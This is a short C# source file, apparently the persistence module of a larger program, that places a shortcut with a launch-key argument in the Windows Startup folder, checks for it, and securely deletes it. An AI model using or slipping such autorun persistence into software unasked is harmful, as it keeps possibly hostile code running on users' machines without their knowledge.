namespace Main.Source.Functions.Persistence
{
    public class StartFolder
    {
        private static string StartupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

        public static void Install(string name, string path)
        {
            Utilities.Shortcut.CreateShortcut(
                path,
                Path.Join(StartupDir, name),
                args: ConfigMisc.LAUNCH_KEY
            );
        }

        public static void Uninstall(string name)
        {
            string path = Path.Join(StartupDir, name + ".lnk");
            if (!File.Exists(path))
            {
                Utilities.Logger.Error("StartFolder.Uninstall: failed to find file");
                return;
            }

            Utilities.Files.SecureDelete(path);
        }

        public static string Check(string name)
        {
            string path = Path.Join(StartupDir, name + ".lnk");
            if (!File.Exists(path))
            {
                return "Failed to find file (bad)";
            }

            return "All is good (good)";
        }
    }
}
